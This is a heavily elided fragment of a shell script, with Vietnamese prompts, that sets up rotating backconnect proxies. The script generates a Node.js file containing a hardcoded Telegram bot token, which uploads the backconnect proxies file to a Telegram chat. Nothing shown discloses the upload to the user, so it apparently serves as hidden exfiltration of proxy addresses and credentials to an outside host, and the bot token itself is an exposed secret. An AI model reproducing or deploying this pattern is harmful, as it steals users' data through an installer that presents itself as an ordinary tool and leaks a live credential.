...
echo "Nhap so phut xoay proxy, 0 thi se khong xoay"
...
WORKNODE="$proxy_dir/send-file.js"
...
if [[ $backconnect_proxies_file == "default" ]]; then backconnect_proxies_file="$proxy_dir/backconnect_proxies.txt"; fi;
...
#  is_auth_used;
#  echo "auth data: $(is_auth_used) vs $use_auth";
...
const token = '6230890582:AAG-oqJ5oJuqrF4yL9MF5aFun-qHbyDsGro';
...
class sendFile {
    constructor() {
        ...
        const stream = fs.createReadStream('${backconnect_proxies_file}');
        bot.sendDocument(this.chatID, stream).then(() => {
            process.exit(1);
        });
    }
}
